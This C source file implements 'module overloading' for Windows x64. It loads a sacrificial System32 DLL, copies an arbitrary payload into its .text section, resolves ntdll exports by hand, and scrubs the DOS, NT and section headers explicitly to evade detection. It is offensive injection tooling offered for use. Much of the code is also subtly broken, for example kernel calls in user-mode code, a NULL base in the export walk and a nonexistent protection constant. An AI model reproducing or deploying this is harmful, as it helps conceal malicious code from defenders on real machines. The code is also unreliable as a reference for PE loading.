/*
 * Module Overloading - Implementation
 *
 * Stealthy code injection via sacrificial DLL loading with:
 * - Manual mapping and base relocation
 * - Hookless import address table resolver
 * - Post-mapping header scrubbing
 *
 * Target: Windows 10/11 x64
 * Environment: No-CRT
 */

#include "ModuleOverloading.h"

//------------------------------------------------------------------------------
// Global State for Module Overloading
//------------------------------------------------------------------------------

static MODULE_OVERLOADING_CONTEXT G_ModuleOverloadingContext;

//------------------------------------------------------------------------------
// InitializeModuleOverloading
//
// Initializes the Module Overloading context structure
// with default values and validates memory allocation.
//
// Parameters:
//   Context    - Output pointer to Module Overloading context
//
// Returns:
//   STATUS_SUCCESS on success, NTSTATUS error code otherwise
//------------------------------------------------------------------------------

NTSTATUS InitializeModuleOverloading(
    OUT PMODULE_OVERLOADING_CONTEXT Context
)
{
    if (Context == NULL) {
        return STATUS_INVALID_PARAMETER;
    }

    // Zero out context structure
    RtlZeroMemory(Context, sizeof(MODULE_OVERLOADING_CONTEXT));

    // Set identification tag
    Context->Tag = MODULE_OVERLOADING_TAG;

    // Initialize state
    Context->State = ModuleOverloadingIdle;
    Context->LastError = STATUS_SUCCESS;

    // Initialize default DLL path
    RtlInitUnicodeString(&Context->SacrificialDllPath, SACRIFICIAL_DLL_DEFAULT);

    // Initialize counters
    Context->TotalOperations = 0;
    Context->RelocationsApplied = 0;
    Context->ImportsResolved = 0;

    return STATUS_SUCCESS;
}

//------------------------------------------------------------------------------
// SelectSacrificialDll
//
// Selects and validates a sacrificial DLL from System32.
// Verifies minimum size requirements and file existence.
//
// Parameters:
//   Context    - Pointer to Module Overloading context
//   DllPath    - Output pointer to DLL path string
//   DllSize    - Output pointer to DLL size in bytes
//
// Returns:
//   STATUS_SUCCESS on success, NTSTATUS error code otherwise
//------------------------------------------------------------------------------

NTSTATUS SelectSacrificialDll(
    OUT PMODULE_OVERLOADING_CONTEXT Context,
    IN PUNICODE_STRING DllPath,
    OUT PSIZE_T DllSize
)
{
    NTSTATUS Status;
    OBJECT_ATTRIBUTES ObjectAttributes;
    UNICODE_STRING FileName;
    IO_STATUS_BLOCK IoStatus;
    HANDLE FileHandle;
    FILE_STANDARD_INFO FileInfo;
    WCHAR System32Path[MAX_PATH];
    WCHAR FullDllPath[MAX_PATH];

    if (Context == NULL || DllPath == NULL || DllSize == NULL) {
        return STATUS_INVALID_PARAMETER;
    }

    // Get System32 directory path
    if (GetSystemDirectoryW(System32Path, MAX_PATH) == 0) {
        return STATUS_UNSUCCESSFUL;
    }

    // Build full path for primary sacrificial DLL
    swprintf_s(FullDllPath, MAX_PATH, L"%s\\wtsapi32.dll", System32Path);
    RtlInitUnicodeString(&FileName, FullDllPath);

    // Initialize object attributes
    InitializeObjectAttributes(
        &ObjectAttributes,
        &FileName,
        OBJ_CASE_INSENSITIVE,
        NULL,
        NULL
    );

    // Open file for read access
    FileHandle = IoCreateFile(
        &IoStatus,
        FILE_GENERIC_READ,
        &ObjectAttributes,
        NULL,
        FILE_ATTRIBUTE_NORMAL,
        FILE_NON_DIRECTORY_FILE,
        NULL,
        IRP_MJ_CREATE,
        NULL,
        0,
        FILE_OPEN
    );

    if (!IS_SUCCESS(FileHandle)) {
        // Try fallback DLL
        swprintf_s(FullDllPath, MAX_PATH, L"%s\\profapi.dll", System32Path);
        RtlInitUnicodeString(&FileName, FullDllPath);

        ObjectAttributes.ObjectName = &FileName;
        FileHandle = IoCreateFile(
            &IoStatus,
            FILE_GENERIC_READ,
            &ObjectAttributes,
            NULL,
            FILE_ATTRIBUTE_NORMAL,
            FILE_NON_DIRECTORY_FILE,
            NULL,
            IRP_MJ_CREATE,
            NULL,
            0,
            FILE_OPEN
        );
    }

    if (IoStatus.Status != STATUS_SUCCESS) {
        Context->LastError = IoStatus.Status;
        return IoStatus.Status;
    }

    // Query file information
    Status = IoQueryFile(
        FileHandle,
        &IoStatus,
        &FileInfo,
        sizeof(FILE_STANDARD_INFO),
        FileStandardInformation,
        FALSE
    );

    if (!IS_SUCCESS(Status)) {
        IoClose(FileHandle);
        Context->LastError = Status;
        return Status;
    }

    // Validate minimum size requirement
    ULONGLONG FileSize = FileInfo.EndOfFile.QuadPart;
    *DllSize = (SIZE_T)FileSize;

    if (*DllSize < SACRIFICIAL_DLL_MIN_SIZE) {
        IoClose(FileHandle);
        Context->LastError = STATUS_BUFFER_TOO_SMALL;
        return STATUS_BUFFER_TOO_SMALL;
    }

    // Store DLL path in context
    Context->SacrificialDllPath = FileName;
    Context->DllSize = *DllSize;

    IoClose(FileHandle);
    Context->State = ModuleOverloadingDllSelected;
    Context->TotalOperations++;

    *DllPath = &Context->SacrificialDllPath;

    return STATUS_SUCCESS;
}

//------------------------------------------------------------------------------
// LoadSacrificialDll
//
// Loads the sacrificial DLL via LoadLibrary to establish a valid
// MEM_IMAGE entry in the VAD tree.
//
// Parameters:
//   Context    - Pointer to Module Overloading context
//   DllPath    - Pointer to DLL path string
//
// Returns:
//   STATUS_SUCCESS on success, NTSTATUS error code otherwise
//------------------------------------------------------------------------------

NTSTATUS LoadSacrificialDll(
    IN PMODULE_OVERLOADING_CONTEXT Context,
    IN PUNICODE_STRING DllPath
)
{
    NTSTATUS Status;
    PVOID BaseAddress;
    PDOS_HEADER DosHeader;
    PNT_HEADERS NtHeaders;
    PIMAGE_NT_HEADERS NtHeadersFull;
    PIMAGE_SECTION_HEADER SectionHeader;
    ULONG i;

    if (Context == NULL || DllPath == NULL) {
        return STATUS_INVALID_PARAMETER;
    }

    // Load DLL into address space - creates MEM_IMAGE VAD entry
    BaseAddress = LoadLibraryW(DllPath->Buffer);
    if (BaseAddress == NULL) {
        Context->LastError = (NTSTATUS)GetLastError();
        return STATUS_DLL_INIT_FAILED;
    }

    Context->DllHandle = (HANDLE)BaseAddress;
    Context->DllBaseAddress = BaseAddress;

    // Cache DOS header
    DosHeader = (PDOS_HEADER)BaseAddress;
    if (DosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
        FreeLibrary((HMODULE)BaseAddress);
        Context->LastError = STATUS_INVALID_IMAGE_FORMAT;
        return STATUS_INVALID_IMAGE_FORMAT;
    }

    Context->DosHeader = DosHeader;

    // Cache NT headers
    NtHeadersFull = (PIMAGE_NT_HEADERS)((PUCHAR)BaseAddress + DosHeader->e_lfanew);
    if (NtHeadersFull->Signature != IMAGE_NT_SIGNATURE) {
        FreeLibrary((HMODULE)BaseAddress);
        Context->LastError = STATUS_INVALID_IMAGE_FORMAT;
        return STATUS_INVALID_IMAGE_FORMAT;
    }

    // Cast to our NT_HEADERS structure
    NtHeaders = (PNT_HEADERS)&NtHeadersFull->OptionalHeader;
    Context->NtHeaders = NtHeaders;

    // Cache section headers
    SectionHeader = IMAGE_FIRST_SECTION(NtHeadersFull);
    Context->SectionHeaders = SectionHeader;
    Context->NumberOfSections = NtHeadersFull->FileHeader.NumberOfSections;

    // Store image base for relocation calculations
    Context->DllImageBase = NtHeaders->OptionalHeader.ImageBase;

    // Identify .text section for payload injection
    for (i = 0; i < Context->NumberOfSections; i++) {
        if (RtlCompareMemory(SectionHeader[i].Name, ".text", 5) == 5) {
            Context->TextSectionBase = (PVOID)((ULONG_PTR)BaseAddress + SectionHeader[i].VirtualAddress);
            Context->TextSectionSize = SectionHeader[i].VirtualSize;
            break;
        }
    }

    Context->State = ModuleOverloadingDllLoaded;
    Context->TotalOperations++;
    Context->LoadTime = KeQueryTickCount();

    return STATUS_SUCCESS;
}

//------------------------------------------------------------------------------
// ValidateMemImageEntry
//
// Validates that the DLL has established a valid MEM_IMAGE entry
// in the VAD tree by checking memory protection attributes.
//
// Parameters:
//   Context    - Pointer to Module Overloading context
//
// Returns:
//   TRUE if MEM_IMAGE entry is valid, FALSE otherwise
//------------------------------------------------------------------------------

BOOLEAN ValidateMemImageEntry(
    IN PMODULE_OVERLOADING_CONTEXT Context
)
{
    PMEMORY_BASIC_INFORMATION MemoryInfo;
    SIZE_T QueryResult;
    ULONG ExpectedProtection;

    if (Context == NULL || Context->DllBaseAddress == NULL) {
        return FALSE;
    }

    MemoryInfo = (PMEMORY_BASIC_INFORMATION)Context->DllBaseAddress;
    QueryResult = VirtualQuery(
        Context->DllBaseAddress,
        MemoryInfo,
        sizeof(MEMORY_BASIC_INFORMATION)
    );

    if (QueryResult == 0) {
        return FALSE;
    }

    // Verify MEM_IMAGE allocation type
    if ((MemoryInfo->State & MEM_COMMIT) == 0 ||
        (MemoryInfo->State & MEM_RESERVE) == 0) {
        return FALSE;
    }

    // Verify executable protection (PAGE_EXECUTE_READ or PAGE_EXECUTE_READWRITE)
    ExpectedProtection = MemoryInfo->Protection;
    if (ExpectedProtection != PAGE_EXECUTE_READ &&
        ExpectedProtection != PAGE_EXECUTE_READWRITE &&
        ExpectedProtection != PAGE_EXECUTE_READEXEC) {
        return FALSE;
    }

    Context->TotalOperations++;
    return TRUE;
}

//------------------------------------------------------------------------------
// ParseBaseRelocationTable
//
// Parses the PE Base Relocation Table to identify all
// relocation blocks and their contents.
//
// Parameters:
//   Context    - Pointer to Module Overloading context
//   RelocationCount - Output pointer to total relocation count
//
// Returns:
//   STATUS_SUCCESS on success, NTSTATUS error code otherwise
//------------------------------------------------------------------------------

NTSTATUS ParseBaseRelocationTable(
    IN PMODULE_OVERLOADING_CONTEXT Context,
    OUT PULONG RelocationCount
)
{
    PIMAGE_DATA_DIRECTORY RelocationDir;
    PIMAGE_BASE_RELOCATION RelocationBlock;
    PIMAGE_RELOCANT Relocant;
    ULONG HeaderIndex;
    ULONG BlockCount;
    ULONG TotalRelocations;
    PUCHAR RelocationBase;

    if (Context == NULL || RelocationCount == NULL) {
        return STATUS_INVALID_PARAMETER;
    }

    *RelocationCount = 0;

    // Get relocation directory from OptionalHeader
    RelocationDir = &Context->NtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];

    if (RelocationDir->VirtualAddress == 0 || RelocationDir->Size == 0) {
        Context->LastError = STATUS_NOT_FOUND;
        return STATUS_NOT_FOUND;
    }

    Context->RelocationTableRva = RelocationDir->VirtualAddress;
    Context->RelocationTableSize = RelocationDir->Size;
    RelocationBase = (PUCHAR)Context->DllBaseAddress + RelocationDir->VirtualAddress;

    // Parse relocation blocks
    TotalRelocations = 0;
    HeaderIndex = 0;

    while (HeaderIndex < RelocationDir->Size) {
        RelocationBlock = (PIMAGE_BASE_RELOCATION)(RelocationBase + HeaderIndex);

        // Validate relocation block
        if (!ValidateRelocationBlock(
            (PRELOCATION_BLOCK)RelocationBlock,
            RelocationBlock->SizeOfBlock
        )) {
            Context->LastError = STATUS_INVALID_PARAMETER;
            return STATUS_INVALID_PARAMETER;
        }

        // Process relocants in this block
        if (RelocationBlock->SizeOfBlock > sizeof(IMAGE_BASE_RELOCATION)) {
            BlockCount = (RelocationBlock->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) /
                          sizeof(IMAGE_RELOCANT);

            for (ULONG i = 0; i < BlockCount; i++) {
                Relocant = &((PIMAGE_RELOCANT)(RelocationBlock->SizeOfBlock))[i];
                // Count valid relocations
                if ((Relocant->Type & 0xFFF) != 0) {
                    TotalRelocations++;
                }
            }
        }

        HeaderIndex += RelocationBlock->SizeOfBlock;
    }

    Context->RelocationsApplied = TotalRelocations;
    *RelocationCount = TotalRelocations;
    Context->State = ModuleOverloadingRelocationApplied;
    Context->TotalOperations++;

    return STATUS_SUCCESS;
}

//------------------------------------------------------------------------------
// ValidateRelocationBlock
//
// Validates a relocation block structure and its integrity.
//
// Parameters:
//   Block    - Pointer to relocation block
//   BlockSize - Size of the block in bytes
//
// Returns:
//   TRUE if valid, FALSE otherwise
//------------------------------------------------------------------------------

BOOLEAN ValidateRelocationBlock(
    IN PRELOCATION_BLOCK Block,
    IN ULONG BlockSize
)
{
    if (Block == NULL) {
        return FALSE;
    }

    // Minimum block size check
    if (BlockSize < sizeof(IMAGE_BASE_RELOCATION)) {
        return FALSE;
    }

    // Virtual address alignment check (must be page-aligned)
    if ((Block->VirtualAddress & 0xFFF) != 0) {
        return FALSE;
    }

    return TRUE;
}

//------------------------------------------------------------------------------
// ApplyBaseRelocations
//
// Applies base relocations to the loaded module based on
// the difference between image base and actual load address.
//
// Parameters:
//   Context    - Pointer to Module Overloading context
//   Delta      - Difference between actual and preferred base address
//
// Returns:
//   STATUS_SUCCESS on success, NTSTATUS error code otherwise
//------------------------------------------------------------------------------

NTSTATUS ApplyBaseRelocations(
    IN PMODULE_OVERLOADING_CONTEXT Context,
    IN ULONGLONG Delta
)
{
    PIMAGE_DATA_DIRECTORY RelocationDir;
    PIMAGE_BASE_RELOCATION RelocationBlock;
    PIMAGE_RELOCANT Relocant;
    ULONG HeaderIndex;
    PUCHAR RelocationBase;
    PULONG TargetAddress;
    USHORT RelocationType;

    if (Context == NULL || Delta == 0) {
        return STATUS_SUCCESS;
    }

    // Get relocation directory
    RelocationDir = &Context->NtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
    RelocationBase = (PUCHAR)Context->DllBaseAddress + RelocationDir->VirtualAddress;
    HeaderIndex = 0;

    // Process each relocation block
    while (HeaderIndex < RelocationDir->Size) {
        RelocationBlock = (PIMAGE_BASE_RELOCATION)(RelocationBase + HeaderIndex);

        // Calculate number of relocants in this block
        if (RelocationBlock->SizeOfBlock > sizeof(IMAGE_BASE_RELOCATION)) {
            ULONG RelocantCount = (RelocationBlock->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) /
                                   sizeof(IMAGE_RELOCANT);
            PIMAGE_RELOCANT RelocantArray = (PIMAGE_RELOCANT)((PUCHAR)RelocationBlock + sizeof(IMAGE_BASE_RELOCATION));

            for (ULONG i = 0; i < RelocantCount; i++) {
                Relocant = &RelocantArray[i];
                RelocationType = (Relocant->Type & 0xFFF);

                // Calculate target address
                TargetAddress = (PULONG)((ULONG_PTR)Context->DllBaseAddress +
                                         RelocationBlock->VirtualAddress +
                                         (Relocant->Offset & 0xFFF));

                // Apply relocation based on type
                switch (RelocationType) {
                case IMAGE_REL_BASED_DIR64:
                    *TargetAddress += (ULONG)Delta;
                    break;

                case IMAGE_REL_BASED_HIGH:
                    *TargetAddress += (ULONG)(Delta >> 16);
                    break;

                case IMAGE_REL_BASED_LOW:
                    *TargetAddress += (ULONG)(Delta & 0xFFFF);
                    break;

                case IMAGE_REL_BASED_HIGHADJ:
                    // High adjustment for DIR64
                    *TargetAddress += (ULONG)(Delta >> 16);
                    break;

                default:
                    break;
                }

                Context->RelocationsApplied++;
            }
        }

        HeaderIndex += RelocationBlock->SizeOfBlock;
    }

    Context->TotalOperations++;
    return STATUS_SUCCESS;
}

//------------------------------------------------------------------------------
// InitializeNtdllExportDirectory
//
// Initializes the ntdll.dll export directory for hookless
// import resolution by loading and parsing the module.
//
// Parameters:
//   Context    - Pointer to Module Overloading context
//
// Returns:
//   STATUS_SUCCESS on success, NTSTATUS error code otherwise
//------------------------------------------------------------------------------

NTSTATUS InitializeNtdllExportDirectory(
    IN PMODULE_OVERLOADING_CONTEXT Context
)
{
    NTSTATUS Status;
    HANDLE NtdllHandle;
    PVOID NtdllBase;
    PDOS_HEADER NtdllDosHeader;
    PIMAGE_NT_HEADERS NtdllNtHeaders;
    PIMAGE_DATA_DIRECTORY ExportDirEntry;
    PEXPORT_DIRECTORY ExportDirectory;
    WCHAR NtdllPath[MAX_PATH];

    if (Context == NULL) {
        return STATUS_INVALID_PARAMETER;
    }

    // Build ntdll.dll path
    GetSystemDirectoryW(NtdllPath, MAX_PATH);
    wcscat_s(NtdllPath, MAX_PATH, L"\\ntdll.dll");

    // Load ntdll.dll
    NtdllHandle = LoadLibraryW(NtdllPath);
    if (NtdllHandle == NULL) {
        Context->LastError = (NTSTATUS)GetLastError();
        return STATUS_DLL_INIT_FAILED;
    }

    NtdllBase = NtdllHandle;
    Context->NtdllBaseAddress = NtdllBase;

    // Parse DOS and NT headers
    NtdllDosHeader = (PDOS_HEADER)NtdllBase;
    if (NtdllDosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
        FreeLibrary((HMODULE)NtdllBase);
        return STATUS_INVALID_IMAGE_FORMAT;
    }

    NtdllNtHeaders = (PIMAGE_NT_HEADERS)((PUCHAR)NtdllBase + NtdllDosHeader->e_lfanew);
    if (NtdllNtHeaders->Signature != IMAGE_NT_SIGNATURE) {
        FreeLibrary((HMODULE)NtdllBase);
        return STATUS_INVALID_IMAGE_FORMAT;
    }

    // Get export directory entry
    ExportDirEntry = &NtdllNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];

    if (ExportDirEntry->VirtualAddress == 0) {
        FreeLibrary((HMODULE)NtdllBase);
        return STATUS_NOT_FOUND;
    }

    // Cache export directory
    ExportDirectory = (PEXPORT_DIRECTORY)((PUCHAR)NtdllBase + ExportDirEntry->VirtualAddress);
    Context->NtdllExportDirectory = ExportDirectory;

    Context->State = ModuleOverloadingImportsResolved;
    Context->TotalOperations++;

    return STATUS_SUCCESS;
}

//------------------------------------------------------------------------------
// ResolveExportByName
//
// Manually resolves an export function by name by walking
// the Export Directory without using GetProcAddress.
//
// Parameters:
//   Context    - Pointer to Module Overloading context
//   FunctionName - Name of the function to resolve
//
// Returns:
//   Function address on success, NULL otherwise
//------------------------------------------------------------------------------

PVOID ResolveExportByName(
    IN PMODULE_OVERLOADING_CONTEXT Context,
    IN PCHAR FunctionName
)
{
    PEXPORT_DIRECTORY ExportDir;
    PULONG Functions;
    PULONG Names;
    PUSHORT NameOrdinals;
    ULONG FunctionRva;
    PVOID FunctionAddress;

    if (Context == NULL || FunctionName == NULL || Context->NtdllExportDirectory == NULL) {
        return NULL;
    }

    ExportDir = Context->NtdllExportDirectory;

    // Walk export directory to find function
    if (!WalkExportDirectory(ExportDir, FunctionName, &FunctionRva)) {
        Context->LastError = STATUS_NOT_FOUND;
        return NULL;
    }

    // Calculate function address
    Functions = (PULONG)((PUCHAR)Context->NtdllBaseAddress + ExportDir->AddressOfFunctions);
    FunctionAddress = (PVOID)((PUCHAR)Context->NtdllBaseAddress + Functions[FunctionRva]);

    // Cache resolved function
    if (Context->ResolvedFunctionCount < 256) {
        Context->ResolvedFunctions[Context->ResolvedFunctionCount] = (ULONG)FunctionAddress;
        Context->ResolvedFunctionCount++;
        Context->ImportsResolved++;
    }

    Context->TotalOperations++;
    return FunctionAddress;
}

//------------------------------------------------------------------------------
// ResolveExportByOrdinal
//
// Manually resolves an export function by ordinal value.
//
// Parameters:
//   Context    - Pointer to Module Overloading context
//   FunctionOrdinal - Ordinal value of the function
//
// Returns:
//   Function address on success, NULL otherwise
//------------------------------------------------------------------------------

PVOID ResolveExportByOrdinal(
    IN PMODULE_OVERLOADING_CONTEXT Context,
    IN ULONG FunctionOrdinal
)
{
    PEXPORT_DIRECTORY ExportDir;
    PULONG Functions;
    PVOID FunctionAddress;

    if (Context == NULL || Context->NtdllExportDirectory == NULL) {
        return NULL;
    }

    ExportDir = Context->NtdllExportDirectory;

    // Adjust ordinal by base
    ULONG AdjustedOrdinal = FunctionOrdinal - ExportDir->Base;

    if (AdjustedOrdinal >= ExportDir->NumberOfFunctions) {
        Context->LastError = STATUS_NOT_FOUND;
        return NULL;
    }

    // Calculate function address
    Functions = (PULONG)((PUCHAR)Context->NtdllBaseAddress + ExportDir->AddressOfFunctions);
    FunctionAddress = (PVOID)((PUCHAR)Context->NtdllBaseAddress + Functions[AdjustedOrdinal]);

    if (Context->ResolvedFunctionCount < 256) {
        Context->ResolvedFunctions[Context->ResolvedFunctionCount] = (ULONG)FunctionAddress;
        Context->ResolvedFunctionCount++;
        Context->ImportsResolved++;
    }

    Context->TotalOperations++;
    return FunctionAddress;
}

//------------------------------------------------------------------------------
// WalkExportDirectory
//
// Walks the Export Directory to find a function by name.
// Returns the RVA of the function if found.
//
// Parameters:
//   ExportDir    - Pointer to export directory
//   TargetName   - Name of the target function
//   FunctionRva  - Output pointer to function RVA
//
// Returns:
//   TRUE if found, FALSE otherwise
//------------------------------------------------------------------------------

BOOLEAN WalkExportDirectory(
    IN PEXPORT_DIRECTORY ExportDir,
    IN PCHAR TargetName,
    OUT PULONG FunctionRva
)
{
    PCHAR NameBuffer;
    PCHAR FunctionName;
    PUSHORT NameOrdinals;
    ULONG NameRva;
    ULONG OrdinalIndex;
    ULONG StringCompareResult;

    if (ExportDir == NULL || TargetName == NULL || FunctionRva == NULL) {
        return FALSE;
    }

    *FunctionRva = 0;

    // Base address for RVA calculations
    PVOID BaseAddress = NULL;  // Will be set by caller context

    // Iterate through name directory
    for (ULONG i = 0; i < ExportDir->NumberOfNames; i++) {
        Names = (PULONG)((PUCHAR)BaseAddress + ExportDir->AddressOfNames);
        NameRva = Names[i];
        FunctionName = (PCHAR)((PUCHAR)BaseAddress + NameRva);

        // Compare function name (case-insensitive)
        StringCompareResult = _stricmp(FunctionName, TargetName);

        if (StringCompareResult == 0) {
            // Found matching name, get ordinal
            NameOrdinals = (PUSHORT)((PUCHAR)BaseAddress + ExportDir->AddressOfNameOrdinals);
            OrdinalIndex = NameOrdinals[i];

            // Validate ordinal is within function table
            if (OrdinalIndex < ExportDir->NumberOfFunctions) {
                *FunctionRva = OrdinalIndex;
                return TRUE;
            }
        }
    }

    return FALSE;
}

//------------------------------------------------------------------------------
// ScrubDosHeader
//
// Zeros out the DOS header after the payload is resident,
// reducing the detection surface.
//
// Parameters:
//   Context    - Pointer to Module Overloading context
//
// Returns:
//   STATUS_SUCCESS on success, NTSTATUS error code otherwise
//------------------------------------------------------------------------------

NTSTATUS ScrubDosHeader(
    IN PMODULE_OVERLOADING_CONTEXT Context
)
{
    PDOS_HEADER DosHeader;
    SIZE_T DosHeaderSize;

    if (Context == NULL || Context->DosHeader == NULL) {
        return STATUS_INVALID_PARAMETER;
    }

    DosHeader = Context->DosHeader;

    // Preserve e_lfanew for potential recovery
    ULONG NtHeadersOffset = DosHeader->e_lfanew;

    // Zero out entire DOS header (first 64 bytes)
    DosHeaderSize = sizeof(DOS_HEADER);
    RtlZeroMemory(DosHeader, DosHeaderSize);

    // Restore e_lfanew for compatibility
    DosHeader->e_lfanew = NtHeadersOffset;

    Context->ScrubbedHeaderSize += DosHeaderSize;
    Context->TotalOperations++;

    return STATUS_SUCCESS;
}

//------------------------------------------------------------------------------
// ScrubNtHeaders
//
// Zeros out the NT Headers (File Header and Optional Header)
// after the payload is resident.
//
// Parameters:
//   Context    - Pointer to Module Overloading context
//
// Returns:
//   STATUS_SUCCESS on success, NTSTATUS error code otherwise
//------------------------------------------------------------------------------

NTSTATUS ScrubNtHeaders(
    IN PMODULE_OVERLOADING_CONTEXT Context
)
{
    PNT_HEADERS NtHeaders;
    SIZE_T NtHeadersSize;

    if (Context == NULL || Context->NtHeaders == NULL) {
        return STATUS_INVALID_PARAMETER;
    }

    NtHeaders = Context->NtHeaders;

    // Calculate total NT headers size
    NtHeadersSize = sizeof(ULONG) +  // Signature
                     sizeof(IMAGE_FILE_HEADER) +  // File Header
                     NtHeaders->OptionalHeader.SizeOfHeaders -  // Full optional header size
                     sizeof(IMAGE_FILE_HEADER);

    // Zero out NT headers
    RtlZeroMemory(NtHeaders, NtHeadersSize);

    Context->ScrubbedHeaderSize += NtHeadersSize;
    Context->TotalOperations++;

    return STATUS_SUCCESS;
}

//------------------------------------------------------------------------------
// ScrubSectionHeaders
//
// Zeros out the Section Headers after the payload is resident.
//
// Parameters:
//   Context    - Pointer to Module Overloading context
//
// Returns:
//   STATUS_SUCCESS on success, NTSTATUS error code otherwise
//------------------------------------------------------------------------------

NTSTATUS ScrubSectionHeaders(
    IN PMODULE_OVERLOADING_CONTEXT Context
)
{
    PSECTION_HEADER SectionHeaders;
    SIZE_T SectionHeadersSize;

    if (Context == NULL || Context->SectionHeaders == NULL) {
        return STATUS_INVALID_PARAMETER;
    }

    SectionHeaders = Context->SectionHeaders;
    SectionHeadersSize = sizeof(SECTION_HEADER) * Context->NumberOfSections;

    // Zero out all section headers
    RtlZeroMemory(SectionHeaders, SectionHeadersSize);

    Context->ScrubbedHeaderSize += SectionHeadersSize;
    Context->TotalOperations++;

    return STATUS_SUCCESS;
}

//------------------------------------------------------------------------------
// PerformHeaderScrubbing
//
// Executes the complete header scrubbing routine,
// zeroing out DOS, NT, and Section headers.
//
// Parameters:
//   Context    - Pointer to Module Overloading context
//
// Returns:
//   STATUS_SUCCESS on success, NTSTATUS error code otherwise
//------------------------------------------------------------------------------

NTSTATUS PerformHeaderScrubbing(
    IN PMODULE_OVERLOADING_CONTEXT Context
)
{
    NTSTATUS Status;

    if (Context == NULL) {
        return STATUS_INVALID_PARAMETER;
    }

    // Execute scrubbing in order
    Status = ScrubDosHeader(Context);
    if (!IS_SUCCESS(Status)) {
        return Status;
    }

    Status = ScrubNtHeaders(Context);
    if (!IS_SUCCESS(Status)) {
        return Status;
    }

    Status = ScrubSectionHeaders(Context);
    if (!IS_SUCCESS(Status)) {
        return Status;
    }

    Context->HeadersScrubbed = TRUE;
    Context->State = ModuleOverloadingHeadersScrubbed;

    return STATUS_SUCCESS;
}

//------------------------------------------------------------------------------
// VerifyHeaderScrubbing
//
// Verifies that header scrubbing has been completed
// by checking the context state and scrubbed size.
//
// Parameters:
//   Context    - Pointer to Module Overloading context
//
// Returns:
//   TRUE if scrubbing verified, FALSE otherwise
//------------------------------------------------------------------------------

BOOLEAN VerifyHeaderScrubbing(
    IN PMODULE_OVERLOADING_CONTEXT Context
)
{
    if (Context == NULL) {
        return FALSE;
    }

    // Check scrubbing flag
    if (Context->HeadersScrubbed == FALSE) {
        return FALSE;
    }

    // Verify scrubbed size is non-zero
    if (Context->ScrubbedHeaderSize == 0) {
        return FALSE;
    }

    // Verify state is post-scrubbing
    if (Context->State != ModuleOverloadingHeadersScrubbed &&
        Context->State != ModuleOverloadingPayloadInjected) {
        return FALSE;
    }

    return TRUE;
}

//------------------------------------------------------------------------------
// InjectPayloadToTextSection
//
// Injects the custom payload into the .text section
// of the loaded sacrificial DLL.
//
// Parameters:
//   Context    - Pointer to Module Overloading context
//   Payload    - Pointer to payload buffer
//   PayloadSize - Size of the payload
//
// Returns:
//   STATUS_SUCCESS on success, NTSTATUS error code otherwise
//------------------------------------------------------------------------------

NTSTATUS InjectPayloadToTextSection(
    IN PMODULE_OVERLOADING_CONTEXT Context,
    IN PVOID Payload,
    IN SIZE_T PayloadSize
)
{
    NTSTATUS Status;
    PVOID TextSectionBase;
    SIZE_T TextSectionSize;
    ULONG OldProtection;

    if (Context == NULL || Payload == NULL || PayloadSize == 0) {
        return STATUS_INVALID_PARAMETER;
    }

    // Validate payload size against .text section capacity
    if (PayloadSize > Context->TextSectionSize) {
        Context->LastError = STATUS_BUFFER_TOO_SMALL;
        return STATUS_BUFFER_TOO_SMALL;
    }

    TextSectionBase = Context->TextSectionBase;

    // Change protection to allow writing
    Status = (NTSTATUS)VirtualProtect(
        TextSectionBase,
        PayloadSize,
        PAGE_EXECUTE_READWRITE,
        &OldProtection
    );

    if (!IS_SUCCESS(Status)) {
        Context->LastError = Status;
        return Status;
    }

    // Copy payload to .text section
    RtlCopyMemory(TextSectionBase, Payload, PayloadSize);
    Context->PayloadBuffer = Payload;
    Context->PayloadSize = PayloadSize;

    // Restore original protection
    VirtualProtect(
        TextSectionBase,
        PayloadSize,
        PAGE_EXECUTE_READ,
        &OldProtection
    );

    Context->InjectionTime = KeQueryTickCount();
    Context->State = ModuleOverloadingPayloadInjected;
    Context->TotalOperations++;

    return STATUS_SUCCESS;
}

//------------------------------------------------------------------------------
// CleanupModuleOverloading
//
// Cleans up all resources associated with Module Overloading.
//
// Parameters:
//   Context    - Pointer to Module Overloading context
//------------------------------------------------------------------------------

VOID CleanupModuleOverloading(
    IN PMODULE_OVERLOADING_CONTEXT Context
)
{
    if (Context == NULL) {
        return;
    }

    // Unload sacrificial DLL if loaded
    if (Context->DllHandle != NULL) {
        FreeLibrary((HMODULE)Context->DllHandle);
        Context->DllHandle = NULL;
        Context->DllBaseAddress = NULL;
    }

    // Unload ntdll.dll if loaded for export resolution
    if (Context->NtdllBaseAddress != NULL) {
        FreeLibrary((HMODULE)Context->NtdllBaseAddress);
        Context->NtdllBaseAddress = NULL;
        Context->NtdllExportDirectory = NULL;
    }

    // Reset state
    Context->State = ModuleOverloadingIdle;
    Context->HeadersScrubbed = FALSE;
    Context->TotalOperations = 0;

    // Zero out context
    RtlZeroMemory(Context, sizeof(MODULE_OVERLOADING_CONTEXT));
    Context->Tag = MODULE_OVERLOADING_TAG;
}
